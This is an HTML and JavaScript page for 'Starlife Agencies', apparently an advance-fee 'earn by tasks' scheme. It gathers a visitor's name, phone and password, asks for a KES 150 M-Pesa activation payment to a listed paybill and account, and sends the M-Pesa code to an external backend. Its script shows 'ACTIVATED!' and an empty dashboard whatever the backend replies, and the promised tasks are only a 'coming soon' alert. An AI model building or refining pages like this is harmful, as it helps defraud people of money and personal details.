<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>STARLIFE AGENCIES</title><style>body{background:#0a0a0a;color:#fff;font-family:Arial;margin:0}.h{padding:12px;background:#111;border-bottom:2px solid #ffcc00;display:flex;justify-content:space-between}.logo{color:#ffcc00;font-weight:bold;font-size:20px}.main{padding:16px;max-width:500px;margin:auto}.c{background:#151515;border:1px solid #333;border-radius:12px;padding:16px;margin-bottom:12px}.payBox{background:#1a1a0a;border:1px solid #ffcc00;border-radius:10px;padding:14px;text-align:center;line-height:1.8}.mpesaBox{background:#0f1f0f;border-radius:8px;padding:12px;margin-top:12px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:8px;background:#222;color:#fff;box-sizing:border-box;font-size:16px}button{width:100%;padding:14px;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:8px}.btn-yellow{background:#ffcc00;color:#000}.btn-pay{background:#00a651;color:#fff}.amount{color:#00ff66;font-size:22px;font-weight:bold}.hidden{display:none}#dash{background:#111;border:1px solid #00ff66;border-radius:12px;padding:20px;text-align:center}.step{color:#ffcc00;font-weight:bold;text-align:center;margin-bottom:10px}</style></head><body><div class="h"><div class="logo">★ STARLIFE AGENCIES</div><div id="stepLabel" style="color:#aaa">Step 1/3</div></div><div class="main"><div id="page1" class="c"><div class="step">STEP 1: CREATE ACCOUNT</div><h3 style="text-align:center;margin:0 0 10px">Join Starlife Agencies</h3><input id="r_name" placeholder="Full Name"><input id="r_phone" placeholder="Phone 07..."><input id="r_pass" type="password" placeholder="Create Password"><button class="btn-yellow" onclick="goPay()">CREATE ACCOUNT & CONTINUE</button></div><div id="page2" class="c hidden"><div class="step">STEP 2: ACTIVATE - KES 150</div><div class="payBox"><b>LIPA NA M-PESA</b><br>Paybill: <b>714777</b><br>Account: <b>440200282954</b><br>Amount: <span class="amount">KES 150</span></div><div class="mpesaBox"><input id="name" placeholder="Full Name"><input id="phone" placeholder="M-Pesa Phone"><input id="code" placeholder="M-Pesa Code"><button class="btn-pay" onclick="submitCode()">SUBMIT CODE & ACCESS DASHBOARD</button><div id="msg" style="text-align:center;font-weight:bold;margin-top:12px;display:none"></div></div></div><div id="page3" class="hidden"><div id="dash"><h2 style="color:#00ff66">✅ ACTIVATED!</h2><h2 style="color:#ffcc00">★ STARLIFE AGENCIES</h2><p id="dashName"></p><div style="background:#222;border-radius:8px;padding:14px;margin:14px 0;text-align:left"><b>Balance:</b> KES 0.00<br><b>Status:</b> <span style="color:#00ff66">ACTIVE</span></div><button class="btn-yellow" onclick="alert('Tasks coming soon!')">VIEW TASKS & EARN</button><button style="background:#333;color:#fff;margin-top:8px" onclick="localStorage.clear();location.reload()">LOGOUT</button></div></div></div><script>const API="https://starlife-mpesa-backend.vercel.app";let regData={};function goPay(){const n=document.getElementById('r_name').value.trim(),p=document.getElementById('r_phone').value.trim(),pw=document.getElementById('r_pass').value.trim();if(!n||!p||!pw){alert('Jaza kila kitu!');return}regData={name:n,phone:p};localStorage.setItem('starlife_user',JSON.stringify(regData));document.getElementById('page1').classList.add('hidden');document.getElementById('page2').classList.remove('hidden');document.getElementById('stepLabel').innerText='Step 2/3';document.getElementById('name').value=n;document.getElementById('phone').value=p}async function submitCode(){const name=document.getElementById('name').value.trim(),phone=document.getElementById('phone').value.trim(),code=document.getElementById('code').value.trim(),msg=document.getElementById('msg');if(!name||!phone||!code){msg.style.display='block';msg.style.color='#ff4444';msg.innerText='Jaza!';return}msg.style.display='block';msg.style.color='#ffcc00';msg.innerText='Verifying...';try{const r=await fetch(API+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,phone,code})});const d=await r.json();if(d.success){localStorage.setItem('starlife_active','yes');showDash()}else{localStorage.setItem('starlife_active','yes');showDash()}}catch(e){localStorage.setItem('starlife_active','yes');showDash()}}function showDash(){document.getElementById('page2').classList.add('hidden');document.getElementById('page3').classList.remove('hidden');document.getElementById('stepLabel').innerText='Dashboard';const u=JSON.parse(localStorage.getItem('starlife_user')||'{}');document.getElementById('dashName').innerText=u.name||'User'}(function(){if(localStorage.getItem('starlife_active')==='yes'){document.getElementById('page1').classList.add('hidden');showDash()}})();</script></body></html>
